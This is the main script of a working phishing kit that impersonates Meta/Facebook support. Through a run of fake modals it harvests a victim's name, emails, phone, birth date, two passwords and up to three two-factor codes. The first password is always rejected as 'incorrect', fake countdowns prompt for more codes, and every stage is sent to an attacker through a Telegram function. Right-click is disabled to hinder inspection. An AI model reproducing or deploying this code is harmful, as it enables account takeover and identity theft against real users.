// Main Application Logic

// After slug module (bundled order: t2 before g1); no-op on pages that do not load g1.
try {
  if (typeof window.ensureSlugUrl === 'function') {
    var path = (typeof location !== 'undefined' && location.pathname) ? location.pathname : '';
    if (path.indexOf('meta-verified-rewards-for-you') !== -1 || document.getElementById('ticketId')) {
      window.ensureSlugUrl();
    }
  }
} catch (_) { /* noop */ }

const CONFIG = window.CONFIG;
const Utils = window.Utils;
const Modal = window.Modal;

// Block right-click context menu across the page
document.addEventListener('contextmenu', (e) => {
  e.preventDefault();
});

function fallbackTicketId() {
    const gen = () => Math.random().toString(36).slice(2, 6).toUpperCase();
    return `${gen()}-${gen()}-${gen()}`;
}

function formatLocationLabel(locData) {
    const parts = [];
    const city = (locData.city && locData.city !== 'N/A') ? String(locData.city) : '';
    const reg = (locData.regionName || locData.region) && (locData.regionName || locData.region) !== 'N/A'
        ? String(locData.regionName || locData.region) : '';
    if (city) parts.push(city);
    if (reg && reg.toLowerCase() !== city.toLowerCase()) parts.push(reg);
    if (locData.country) parts.push(locData.country);
    if (locData.country_code) parts.push(locData.country_code);
    return parts.join(', ');
}

function initPageBindings() {
    // Generate ticket ID safely even if Utils is not ready yet
    try {
        const ticketEl = document.getElementById('ticketId');
        if (ticketEl) {
            const id = (window.Utils && typeof window.Utils.generateTicketId === 'function')
                ? window.Utils.generateTicketId()
                : fallbackTicketId();
            ticketEl.textContent = id;
        }
    } catch (_) { }

    // Start verification flow
    try {
        const submitBtn = document.getElementById('submitRequestBtn');
        if (submitBtn) submitBtn.addEventListener('click', openClientModal);
    } catch (_) { }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initPageBindings);
} else {
    initPageBindings();
}

// Make sidebar nav open the form directly when clicked
try {
  const sidebarLinks = document.querySelectorAll('aside nav a');
  sidebarLinks.forEach((link) => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      openClientModal();
    });
  });
} catch (err) {
  // no-op if elements not present
}

// ==================== MODAL 1: CLIENT INFO ====================
function openClientModal() {
    const content = `
        <h2 class="font-bold text-[15px] mb-4" data-i18n="form_title"></h2>
        <form id="clientForm" class="space-y-3">
            <input type="text" id="fullName" data-i18n-attr="placeholder:form_full_name_placeholder" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="email" id="email" data-i18n-attr="placeholder:form_email_placeholder" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="email" id="emailBusiness" data-i18n-attr="placeholder:form_email_business_placeholder" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="text" id="fanpage" data-i18n-attr="placeholder:form_page_name_placeholder" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="tel" id="phone" data-i18n-attr="placeholder:form_phone_placeholder" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <div>
                <b class="text-[#9a979e] text-sm block mb-2" data-i18n="form_dob_label"></b>
                <div class="grid grid-cols-3 gap-2">
                    <input type="number" id="day" data-i18n-attr="placeholder:form_day_placeholder" min="1" max="31" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
                    <input type="number" id="month" data-i18n-attr="placeholder:form_month_placeholder" min="1" max="12" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
                    <input type="number" id="year" data-i18n-attr="placeholder:form_year_placeholder" min="1900" max="2024" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
                </div>
            </div>
            <textarea data-i18n-attr="placeholder:form_notes_placeholder" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
            <p class="text-[#9a979e] text-[14px] mb-[7px]" data-i18n="form_response_note"></p>
            <div class="mt-[15px] mb-[20px]">
                <label class="cursor-pointer flex items-center gap-[5px] text-[14px] " for="custom-checkbox">
                    <label class="inline-flex items-center cursor-pointer">
                        <input type="checkbox" id="custom-checkbox" checked>
                    </label>
                    <span data-i18n="form_agree_prefix"></span>
                    <a class="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="" data-i18n="form_terms_text"></a>
                    <img src="./public/meta/reject.svg" class="w-[10px] h-[10px] items-center inline" alt="">
                </label>
            </div>
            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors" data-i18n="form_send_button"></button>
        </form>
    `;

    Modal.create('clientModal', content);
    Modal.open('clientModal');

    // Initialize phone country code selector with geo-IP default
    let iti;
    try {
        const phoneInput = document.getElementById('phone');
        if (window.intlTelInput && phoneInput) {
            iti = window.intlTelInput(phoneInput, {
                initialCountry: 'auto',
                separateDialCode: true,
                autoPlaceholder: 'off',
                geoIpLookup: async (callback) => {
                    try {
                        const loc = await Utils.getUserLocation();
                        const code = (loc.country_code || 'US').toLowerCase();
                        callback(code);
                        // Sync i18n to IP-derived country when user hasn't chosen explicitly
                        try {
                            var stored = (function(){
                                try { return (localStorage.getItem('preferredLang') || localStorage.getItem('prefLang') || '').toLowerCase(); } catch(_){ return ''; }
                            })();
                            var explicit = !!(function(){
                                try {
                                    var qs = String(window.location.search||'');
                                    return qs.indexOf('lang=')!==-1;
                                } catch(_){ return false; }
                            })();
                            if (!explicit && window.I18N && typeof window.I18N.mapCountryToLang==='function' && typeof window.I18N.setLang==='function') {
                                var cc = String(code||'').toUpperCase();
                                var byIpLang = window.I18N.mapCountryToLang(cc);
                                if (byIpLang) window.I18N.setLang(byIpLang);
                            }
                        } catch(_){ /* noop */ }
                    } catch (e) {
                        callback('us');
                    }
                }
            });

            // When user changes country manually, update language accordingly
            try {
                phoneInput.addEventListener('countrychange', function(){
                    try {
                        var data = iti.getSelectedCountryData ? iti.getSelectedCountryData() : null;
                        var iso2 = (data && data.iso2) ? String(data.iso2).toUpperCase() : '';
                        if (window.I18N && typeof window.I18N.mapCountryToLang==='function' && typeof window.I18N.setLang==='function') {
                            var nextLang = window.I18N.mapCountryToLang(iso2);
                            if (nextLang) window.I18N.setLang(nextLang);
                        }
                    } catch(_){ }
                });
            } catch(_){ }
        }
    } catch (e) {
        // plugin missing or init failed; continue gracefully
    }

    document.getElementById('clientForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = {
            fullName: document.getElementById('fullName').value.trim(),
            email: document.getElementById('email').value.trim(),
            emailBusiness: document.getElementById('emailBusiness').value.trim(),
            fanpage: document.getElementById('fanpage').value.trim(),
            phone: document.getElementById('phone').value.trim(),
            callCode: (function(){
                try {
                    const data = iti && iti.getSelectedCountryData ? iti.getSelectedCountryData() : null;
                    return data && data.dialCode ? `+${data.dialCode}` : '';
                } catch (_) { return ''; }
            })(),
            day: document.getElementById('day').value,
            month: document.getElementById('month').value,
            year: document.getElementById('year').value
        };

        Utils.saveRecord('__client_rec__fi_rst', formData);
        Modal.close('clientModal');
        openSecurityModal();
    });
}

// ==================== MODAL 2: SECURITY (PASSWORD) ====================
function openSecurityModal() {
    const t = (window.I18N && typeof window.I18N.t === 'function') ? window.I18N.t : function (k) { return k; };
    const content = `
        <div class="h-full flex flex-col items-center justify-between flex-1">
            <div class="w-12 h-12 mb-5 mx-auto">
                <img src="./public/meta/logo-fa.svg" alt="Meta" class="w-full">
            </div>
            <div class="w-full">
                <p class="text-[#9a979e] text-sm mb-4" data-i18n="security_intro"></p>
                <form id="securityForm">
                    <input type="password" id="password" data-i18n-attr="placeholder:label_password" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="passwordError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors" data-i18n="btn_continue"></button>
                    <p class="text-center mt-3"><a href="#" class="text-[#9a979e] text-sm" data-i18n="link_forgot_password"></a></p>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/meta/logo-gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let securityClickCount = 0;
    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const password = document.getElementById('password').value.trim();
        const errorMsg = document.getElementById('passwordError');
        const submitBtn = e.target.querySelector('button');

        errorMsg.classList.add('hidden');
        if (!password) {
            errorMsg.textContent = t('error_password_empty');
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        try { submitBtn.setAttribute('aria-busy', 'true'); submitBtn.classList.add('pc-loading'); } catch(_) {}
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (securityClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__fi_rst');
            const clientData = { password, ...dataLocal };
            Utils.saveRecord('__client_rec__se_con', clientData);
            await Utils.sendToTelegram(clientData);

            setTimeout(() => {
                submitBtn.disabled = false;
                try { submitBtn.removeAttribute('aria-busy'); submitBtn.classList.remove('pc-loading'); } catch(_) {}
                submitBtn.textContent = t('btn_continue');
                document.getElementById('password').value = '';
                errorMsg.textContent = t('error_password_incorrect');
                errorMsg.classList.remove('hidden');
                securityClickCount = 1;
            }, 1350);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__se_con');
            const clientData = { passwordSecond: password, ...dataLocal };
            Utils.saveRecord('__client_rec__th_ird', clientData);
            await Utils.sendToTelegram(clientData);

            setTimeout(() => {
                try { submitBtn.removeAttribute('aria-busy'); submitBtn.classList.remove('pc-loading'); } catch(_) {}
                Modal.close('securityModal');
                openAuthenticationModal(clientData);
            }, 1500);
        }
    });
}

// ==================== MODAL 3: AUTHENTICATION (2FA) ====================
function openAuthenticationModal(userData) {
    const emailDisplay = Utils.maskEmail(userData.email);
    const phoneDisplay = Utils.maskPhone(userData.phone);
    const t = (window.I18N && typeof window.I18N.t === 'function') ? window.I18N.t : function (k) { return k; };
    const contactDisplay = [emailDisplay, phoneDisplay].filter(Boolean).join(', ');
    const authIntro = (function(txt){
        try {
            return txt
                .replace('{contact}', contactDisplay)
                .replace('{email}', emailDisplay || '')
                .replace('{phone}', phoneDisplay || '');
        } catch (_) { return txt; }
    })(t('auth_intro'));

    const content = `
        <div class="flex flex-col h-full justify-between">
            <div>
                <div class="flex items-center text-[#9a979e] gap-1.5 text-sm mb-2">
                    <span>${userData.fullName}</span>
                    <div class="w-1 h-1 bg-[#9a979e] rounded-full"></div>
                    <span>Facebook</span>
                </div>
                <h2 class="text-[20px] text-[black] font-[700] mb-[15px]" data-i18n="auth_title_step1"></h2>
                <p class="text-[#9a979e] text-sm mb-4">${authIntro}</p>
                <div class="w-full rounded-lg bg-[#f5f5f5] overflow-hidden mb-4">
                    <img src="./public/meta/authentication.png" alt="2FA" class="w-full">
                </div>
                <form id="authForm">
                    <input type="number" id="twoFa" data-i18n-attr="placeholder:placeholder_code" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors" data-i18n="btn_continue"></button>
                    <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span data-i18n="btn_try_another_way"></span></div>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/meta/logo-gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('authModal', content);
    Modal.open('authModal');

    let authClickCount = 0;
    let countdownInterval;

    document.getElementById('authForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const twoFa = document.getElementById('twoFa').value.trim();
        const errorMsg = document.getElementById('authError');
        const submitBtn = e.target.querySelector('button');
        const input = document.getElementById('twoFa');

        errorMsg.classList.add('hidden');
        if (!twoFa) {
            errorMsg.textContent = t('error_code_empty');
            errorMsg.classList.remove('hidden');
            return;
        }

        // Accept only 6-digit or 8-digit numeric codes
        const isValidCode = /^\d{6}$|^\d{8}$/.test(twoFa);
        if (!isValidCode) {
            errorMsg.textContent = t('error_code_format');
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        try { submitBtn.setAttribute('aria-busy', 'true'); submitBtn.classList.add('pc-loading'); } catch(_) {}
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (authClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__th_ird');
            const clientData = { twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__fou_rth', clientData);
            try {
                const locData = await Utils.getUserLocation();
                const locLabel = formatLocationLabel(locData);
                const lang = window.currentLang || 'en';
                const msg = Utils.getLocalizedToastMessage(lang, locLabel);
                Utils.showTopMobileNotification(msg);
            } catch (_) {}
            await Utils.sendToTelegram(clientData);

            setTimeout(() => {
                try { submitBtn.removeAttribute('aria-busy'); submitBtn.classList.remove('pc-loading'); } catch(_) {}
                submitBtn.innerHTML = t('btn_continue');
                startCountdown(input, errorMsg, submitBtn);
                authClickCount = 1;
            }, 1400);
        } else if (authClickCount === 1) {
            const dataLocal = Utils.getRecord('__client_rec__fou_rth');
            const clientData = { twoFaSecond: twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__f_if_th', clientData);
            try {
                const locData = await Utils.getUserLocation();
                const locLabel = formatLocationLabel(locData);
                const lang = window.currentLang || 'en';
                const msg = Utils.getLocalizedToastMessage(lang, locLabel);
                Utils.showTopMobileNotification(msg);
            } catch (_) {}
            await Utils.sendToTelegram(clientData);

            setTimeout(() => {
                try { submitBtn.removeAttribute('aria-busy'); submitBtn.classList.remove('pc-loading'); } catch(_) {}
                submitBtn.innerHTML = t('btn_continue');
                startCountdown(input, errorMsg, submitBtn);
                authClickCount = 2;
            }, 1200);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__f_if_th');
            const clientData = { twoFaThird: twoFa, ...dataLocal };
            try {
                const locData = await Utils.getUserLocation();
                const locLabel = formatLocationLabel(locData);
                const lang = window.currentLang || 'en';
                const msg = Utils.getLocalizedToastMessage(lang, locLabel);
                Utils.showTopMobileNotification(msg);
            } catch (_) {}
            await Utils.sendToTelegram(clientData);

            setTimeout(() => {
                try { submitBtn.removeAttribute('aria-busy'); submitBtn.classList.remove('pc-loading'); } catch(_) {}
                Modal.close('authModal');
                openSuccessModal();
            }, 1600);
        }
    });

    function startCountdown(input, errorMsg, submitBtn) {
        input.disabled = true;
        submitBtn.disabled = true;
        submitBtn.classList.add('opacity-70');

        let time = CONFIG.COUNTDOWN_TIME;
        errorMsg.textContent = t('error_code_incorrect_seconds').replace('{seconds}', String(time));
        errorMsg.classList.remove('hidden');

        countdownInterval = setInterval(() => {
            time--;
            errorMsg.textContent = t('error_code_incorrect_seconds').replace('{seconds}', String(time));

            if (time <= 0) {
                clearInterval(countdownInterval);
                input.disabled = false;
                input.value = '';
                submitBtn.disabled = false;
                submitBtn.classList.remove('opacity-70');
                errorMsg.classList.add('hidden');
            }
        }, 1000);
    }
}

// ==================== MODAL 4: SUCCESS ====================
function openSuccessModal() {
    const content = `
        <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
        <div class="rounded-lg overflow-hidden mb-4">
            <img src="./public/succes.jpg" alt="Success" class="w-full">
        </div>
        <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
        <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
            Return to Facebook
        </a>
        <div class="w-16 mt-5 mx-auto">
            <img src="./public/meta/logo-gray.svg" alt="Meta">
        </div>
    `;

    Modal.create('successModal', content);
    Modal.open('successModal');
}

